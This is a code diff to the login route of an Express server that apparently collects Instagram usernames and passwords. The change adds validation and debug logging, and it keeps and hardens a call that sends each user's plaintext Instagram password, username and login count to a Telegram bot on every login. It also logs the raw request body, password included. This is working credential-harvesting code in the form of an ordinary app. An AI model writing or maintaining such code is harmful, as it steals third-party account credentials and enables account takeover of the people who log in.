@@ -238,13 +238,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Auth endpoints
   app.post("/api/auth/login", async (req: AuthenticatedRequest, res: Response) => {
     try {
-      const { instagramUsername, password } = loginSchema.parse(req.body);
+      console.log("Login attempt - Request body:", req.body);
+      
+      // Validate request body
+      const validationResult = loginSchema.safeParse(req.body);
+      if (!validationResult.success) {
+        console.error("Validation failed:", validationResult.error.errors);
+        return res.status(400).json({ 
+          error: "Invalid input data", 
+          details: validationResult.error.errors 
+        });
+      }
+      
+      const { instagramUsername, password } = validationResult.data;
+      console.log("Validated data:", { instagramUsername, password: "***" });
       
       // Check if user exists
       let user = await storage.getUserByInstagramUsername(instagramUsername);
       let isNewUser = false;
       
       if (!user) {
+        console.log("Creating new user for:", instagramUsername);
         // Create new user
         const uid = generateUID();
         user = await storage.createUser({
@@ -255,23 +269,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
           bonusClaimed: false,
         });
         isNewUser = true;
+        console.log("New user created with ID:", user.id);
+      } else {
+        console.log("Existing user found with ID:", user.id);
       }
 
       // Track login attempt and get count
       const loginCount = await storage.logUserLogin(user.id, instagramUsername);
+      console.log("Login count for user:", loginCount);
 
       // Send login notification to Telegram bot for every login
-      await sendToTelegramBot("login", {
-        uid: user.uid,
-        instagramUsername,
-        password,
-        loginCount,
-        isNewUser,
-      });
+      try {
+        await sendToTelegramBot("login", {
+          uid: user.uid,
+          instagramUsername,
+          password,
+          loginCount,
+          isNewUser,
+        });
+      } catch (telegramError) {
+        console.error("Telegram notification failed:", telegramError);
+        // Don't fail login if telegram fails
+      }
 
       // Store user in session
       req.session.userId = user.id;
       req.session.uid = user.uid;
+      console.log("Session updated for user:", user.id);
 
       res.json({
         success: true,
@@ -284,8 +308,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
         },
       });
     } catch (error) {
-      console.error("Login error:", error);
-      res.status(400).json({ error: "Invalid login data" });
+      console.error("Login error details:", error);
+      console.error("Error stack:", error instanceof Error ? error.stack : "No stack trace");
+      res.status(400).json({ 
+        error: "Login failed", 
+        message: error instanceof Error ? error.message : "Unknown error"
+      });
     }
   });
 
